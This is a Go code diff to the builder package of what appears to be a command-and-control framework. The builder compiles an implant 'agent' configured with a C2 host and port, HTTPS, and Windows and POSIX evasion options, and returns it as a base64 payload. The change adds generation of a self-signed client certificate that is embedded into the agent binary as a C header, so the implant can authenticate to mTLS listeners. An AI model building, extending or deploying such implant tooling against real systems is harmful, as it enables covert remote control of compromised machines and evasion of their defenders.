@@ -1,12 +1,20 @@
 package builder
 
 import (
+	"crypto/ecdsa"
+	"crypto/elliptic"
+	"crypto/rand"
+	"crypto/x509"
+	"crypto/x509/pkix"
 	"encoding/base64"
+	"encoding/pem"
 	"fmt"
+	"math/big"
 	"os"
 	"os/exec"
 	"path/filepath"
 	"strings"
+	"time"
 )
 
 // ResolveAgentDir finds the agent source directory.
@@ -89,8 +97,101 @@ func boolToFlag(b bool) string {
 	return "0"
 }
 
+// generateAgentPFX creates a self-signed client certificate for mTLS agent
+// authentication. The PFX bytes are written as a C header file that gets
+// compiled into the agent binary. Returns cleanup function.
+func generateAgentPFX(agentDir string) (func(), error) {
+	headerPath := filepath.Join(agentDir, "include", "mtls_cert.h")
+
+	priv, err := ecdsa.GenerateKey(elliptic.P256(), rand.Reader)
+	if err != nil {
+		return nil, fmt.Errorf("generate agent key: %w", err)
+	}
+
+	serial, _ := rand.Int(rand.Reader, new(big.Int).Lsh(big.NewInt(1), 128))
+	template := x509.Certificate{
+		SerialNumber: serial,
+		Subject:      pkix.Name{CommonName: "apex-agent"},
+		NotBefore:    time.Now(),
+		NotAfter:     time.Now().Add(365 * 24 * time.Hour),
+		KeyUsage:     x509.KeyUsageDigitalSignature,
+		ExtKeyUsage:  []x509.ExtKeyUsage{x509.ExtKeyUsageClientAuth},
+	}
+
+	certDER, err := x509.CreateCertificate(rand.Reader, &template, &template, &priv.PublicKey, priv)
+	if err != nil {
+		return nil, fmt.Errorf("create agent cert: %w", err)
+	}
+
+	keyDER, err := x509.MarshalECPrivateKey(priv)
+	if err != nil {
+		return nil, fmt.Errorf("marshal agent key: %w", err)
+	}
+
+	// Write PEM files to temp location for openssl pkcs12 conversion
+	tmpDir, err := os.MkdirTemp("", "apex-mtls-*")
+	if err != nil {
+		return nil, fmt.Errorf("create temp dir: %w", err)
+	}
+
+	certPath := filepath.Join(tmpDir, "agent.crt")
+	keyPath := filepath.Join(tmpDir, "agent.key")
+	pfxPath := filepath.Join(tmpDir, "agent.p12")
+
+	certFile, _ := os.Create(certPath)
+	pem.Encode(certFile, &pem.Block{Type: "CERTIFICATE", Bytes: certDER})
+	certFile.Close()
+
+	keyFile, _ := os.Create(keyPath)
+	pem.Encode(keyFile, &pem.Block{Type: "EC PRIVATE KEY", Bytes: keyDER})
+	keyFile.Close()
+
+	// Use openssl to create PFX (Go stdlib lacks PKCS12 export)
+	cmd := exec.Command("openssl", "pkcs12", "-export",
+		"-out", pfxPath,
+		"-inkey", keyPath,
+		"-in", certPath,
+		"-passout", "pass:")
+	if out, err := cmd.CombinedOutput(); err != nil {
+		os.RemoveAll(tmpDir)
+		return nil, fmt.Errorf("openssl pkcs12: %w\n%s", err, out)
+	}
+
+	pfxData, err := os.ReadFile(pfxPath)
+	os.RemoveAll(tmpDir)
+	if err != nil {
+		return nil, fmt.Errorf("read PFX: %w", err)
+	}
+
+	// Write C header with embedded PFX bytes
+	var sb strings.Builder
+	sb.WriteString("#ifndef MTLS_CERT_H\n#define MTLS_CERT_H\n\n")
+	sb.WriteString("static const unsigned char g_mtls_pfx[] = {")
+	for i, b := range pfxData {
+		if i%16 == 0 {
+			sb.WriteString("\n    ")
+		}
+		fmt.Fprintf(&sb, "0x%02x", b)
+		if i < len(pfxData)-1 {
+			sb.WriteString(",")
+		}
+	}
+	sb.WriteString("\n};\n")
+	fmt.Fprintf(&sb, "static const unsigned int g_mtls_pfx_len = %d;\n", len(pfxData))
+	sb.WriteString("\n#endif\n")
+
+	if err := os.WriteFile(headerPath, []byte(sb.String()), 0644); err != nil {
+		return nil, fmt.Errorf("write mtls_cert.h: %w", err)
+	}
+
+	cleanup := func() {
+		os.Remove(headerPath)
+	}
+	return cleanup, nil
+}
+
 // Build builds the agent for the given platform. Returns output bytes, extension, error.
-func Build(agentDir string, platform Platform, outputFormat, c2Host string, c2Port int, useHTTPS bool,
+func Build(agentDir string, platform Platform, outputFormat, c2Host string, c2Port int, useHTTPS, useMTLS bool,
 	evasion *EvasionOpts, posixEvasion *PosixEvasionOpts) ([]byte, string, error) {
 
 	absDir, err := ResolveAgentDir(agentDir)
@@ -116,6 +217,16 @@ func Build(agentDir string, platform Platform, outputFormat, c2Host string, c2Po
 		fmt.Sprintf("C2_PORT=%d", port),
 		fmt.Sprintf("USE_HTTPS=%d", https),
 	)
+
+	// Generate embedded client certificate for mTLS listeners
+	if useMTLS && platform == PlatformWindows {
+		cleanup, err := generateAgentPFX(absDir)
+		if err != nil {
+			return nil, "", fmt.Errorf("generate mTLS cert: %w", err)
+		}
+		defer cleanup()
+		env = append(env, "USE_MTLS=1")
+	}
 
 	var makeTarget string
 	var outFile string
@@ -252,10 +363,10 @@ func Build(agentDir string, platform Platform, outputFormat, c2Host string, c2Po
 }
 
 // BuildBase64 builds and returns base64-encoded payload and filename.
-func BuildBase64(agentDir string, platform Platform, outputFormat, c2Host string, c2Port int, useHTTPS bool,
+func BuildBase64(agentDir string, platform Platform, outputFormat, c2Host string, c2Port int, useHTTPS, useMTLS bool,
 	evasion *EvasionOpts, posixEvasion *PosixEvasionOpts) (string, string, error) {
 
-	data, ext, err := Build(agentDir, platform, outputFormat, c2Host, c2Port, useHTTPS, evasion, posixEvasion)
+	data, ext, err := Build(agentDir, platform, outputFormat, c2Host, c2Port, useHTTPS, useMTLS, evasion, posixEvasion)
 	if err != nil {
 		return "", "", err
 	}
